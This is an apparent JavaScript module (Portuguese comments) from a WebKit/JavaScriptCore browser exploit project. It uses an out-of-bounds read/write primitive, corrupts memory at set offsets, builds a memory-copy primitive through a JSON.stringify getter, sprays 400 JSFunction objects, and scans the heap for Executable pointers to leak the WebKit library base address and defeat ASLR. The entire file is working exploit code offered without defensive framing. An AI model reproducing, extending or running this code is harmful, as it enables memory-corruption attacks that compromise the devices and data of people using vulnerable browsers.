// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.34";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_34";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180;

let getter_copy_called_flag_v10_34 = false;

// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
// ============================================================
async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
    getter_copy_called_flag_v10_34 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }
    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_34 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();
                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); }
                } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); }
            } catch (e_getter) { try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} }
            return "getter_copy_v10_34_done";
        }
    };
    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5);
    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
    if (!getter_copy_called_flag_v10_34) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PRINCIPAL (v10.34 - Log Detalhado de Base e Heurística Relaxada)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakWebKitPointer_v10.34`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Vazar Ponteiro WebKit (Heurística Relaxada) ---`, "test", FNAME_CURRENT_TEST);

    let sprayedObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // 1. Validar Primitiva de Cópia
        const VALIDATION_OFFSET = 0x2A0;
        const VALIDATION_QWORD = new AdvancedInt64(0x1A2B3C4D, 0x5E6F7A8B); // O valor candidato do seu log anterior
        oob_write_absolute(VALIDATION_OFFSET, VALIDATION_QWORD, 8);
        let copied_validation = await readFromOOBOffsetViaCopy(VALIDATION_OFFSET);
        if (copied_validation && copied_validation.equals(VALIDATION_QWORD)) {
            logS3("  PASSO 1: Primitiva de cópia validada com o valor candidato anterior.", "good", FNAME_CURRENT_TEST);
        } else {
            logS3(`  PASSO 1: FALHA na validação da primitiva de cópia. Lido: ${copied_validation ? copied_validation.toString(true): "null"}. Esperado: ${VALIDATION_QWORD.toString(true)}. Abortando.`, "critical", FNAME_CURRENT_TEST);
            return;
        }
        await PAUSE_S3(50);

        // 2. Pulverizar JSFunctions
        logS3("PASSO 2: Pulverizando objetos JSFunction...", "info", FNAME_CURRENT_TEST);
        const NUM_SPRAY_FUNCS = 400;
        for (let i = 0; i < NUM_SPRAY_FUNCS; i++) {
            sprayedObjects.push(function(_a,_b,_c,_d,_e,_f,_g,_h,_i,_j) { return 0xBEEF0000 + i + _j; });
        }
        logS3(`  ${sprayedObjects.length} JSFunctions pulverizadas.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(500);

        // 3. Escanear
        const SCAN_START = 0x080;
        const SCAN_END = Math.min(0x7F00, oob_array_buffer_real.byteLength - 0x20);
        const SCAN_STEP = 0x08; 

        logS3(`PASSO 3: Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} por Executable*...`, "info", FNAME_CURRENT_TEST);
        
        const functionOffsets = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS;
        if (!functionOffsets || Object.keys(functionOffsets).length === 0) {
            logS3("ERRO: WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS não definido ou vazio!", "critical", FNAME_CURRENT_TEST); return;
        }

        let webkitBaseLeaked = null;
        let potentialLeakCandidatesInfo = [];
        const executablePtrFieldOffset = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET; // 0x18

        for (let cell_base_offset = SCAN_START; cell_base_offset < SCAN_END; cell_base_offset += SCAN_STEP) {
            let offset_to_read_executable_ptr = cell_base_offset + executablePtrFieldOffset;
            if (offset_to_read_executable_ptr >= oob_array_buffer_real.byteLength - 8) continue;

            let potential_executable_ptr = await readFromOOBOffsetViaCopy(offset_to_read_executable_ptr);

            const isPtrZero = isAdvancedInt64Object(potential_executable_ptr) && potential_executable_ptr.low() === 0 && potential_executable_ptr.high() === 0;
            const isPtrBadRead = isAdvancedInt64Object(potential_executable_ptr) && potential_executable_ptr.low() === 0xBADBAD && potential_executable_ptr.high() === 0xDEADDEAD;
            const isPtrBadMagic = isAdvancedInt64Object(potential_executable_ptr) && potential_executable_ptr.low() === 0xBAD68BAD && potential_executable_ptr.high() === 0xBAD68BAD;

            if (potential_executable_ptr && !isPtrZero && !isPtrBadRead && !isPtrBadMagic ) {
                if (potential_executable_ptr.high() !== 0 && potential_executable_ptr.high() !== 0xFFFFFFFF ) { // Heurística ampla
                    potentialLeakCandidatesInfo.push({
                        read_from_oob_offset: offset_to_read_executable_ptr,
                        ptr_value: potential_executable_ptr,
                        origin_cell_base: cell_base_offset
                    });
                }
            }
            if (cell_base_offset > SCAN_START && cell_base_offset % (SCAN_STEP * 256) === 0) { 
                logS3(`    Scan por Executable* em ${toHex(cell_base_offset)}... Candidatos: ${potentialLeakCandidatesInfo.length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(1); 
            }
        } // Fim do loop de scan

        logS3(`  Scan concluído. ${potentialLeakCandidatesInfo.length} ponteiros candidatos (Executable*) encontrados. Analisando...`, "info", FNAME_CURRENT_TEST);

        for (const cand of potentialLeakCandidatesInfo) {
            const leaked_ptr = cand.ptr_value;
            logS3(`  Analisando candidato ${leaked_ptr.toString(true)} (lido de oob[${toHex(cand.read_from_oob_offset)}], célula base provável ${toHex(cand.origin_cell_base)}):`, "info", FNAME_CURRENT_TEST);
            for (const funcName in functionOffsets) {
                const funcOffsetStr = functionOffsets[funcName];
                if (!funcOffsetStr || typeof funcOffsetStr !== 'string') continue;
                try {
                    const funcOffsetAdv = new AdvancedInt64(funcOffsetStr);
                    const potential_base_addr = leaked_ptr.sub(funcOffsetAdv);
                    
                    const isAligned = (potential_base_addr.low() & 0xFFF) === 0;
                    // Heurística de faixa para base (pode precisar de ajuste)
                    const isInRange = potential_base_addr.high() > 0x0 && potential_base_addr.high() < 0x80000; // Aumentado limite superior para high

                    logS3(`    - subtraindo ${funcName} (${funcOffsetAdv.toString(true)}) -> Base: ${potential_base_addr.toString(true)} ${isAligned ? "<-- ALINHADO!" : ""}`, "info", FNAME_CURRENT_TEST);

                    if (isAligned && isInRange) {
                        logS3(`      !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIALMENTE ENCONTRADO !!!!`, "vuln", FNAME_CURRENT_TEST);
                        logS3(`        Ponteiro Executable*: ${leaked_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
                        logS3(`        Corresponde a '${funcName}' (offset config: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
                        logS3(`        Endereço Base Calculado: ${potential_base_addr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
                        document.title = `WebKit Base? ${potential_base_addr.toString(true)}`;
                        webkitBaseLeaked = potential_base_addr;
                        break; 
                    }
                } catch (e_adv64) { /* Ignora */ }
            }
            if (webkitBaseLeaked) break;
        }


        if (webkitBaseLeaked) {
            logS3("VAZAMENTO DE ENDEREÇO BASE DO WEBKIT PARECE BEM-SUCEDIDO!", "good", FNAME_CURRENT_TEST);
        } else {
            logS3("Não foi possível vazar o endereço base do WebKit nesta execução.", "warn", FNAME_CURRENT_TEST);
            if (potentialLeakCandidatesInfo.length > 0) {
                logS3(`  ${potentialLeakCandidatesInfo.length} QWORDs candidatos a ponteiro foram analisados. Verifique os logs detalhados acima para encontrar padrões ou bases alinhadas manualmente.`, "info", FNAME_CURRENT_TEST);
            } else {
                logS3("  Nenhum QWORD candidato a Executable* passou na heurística inicial.", "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
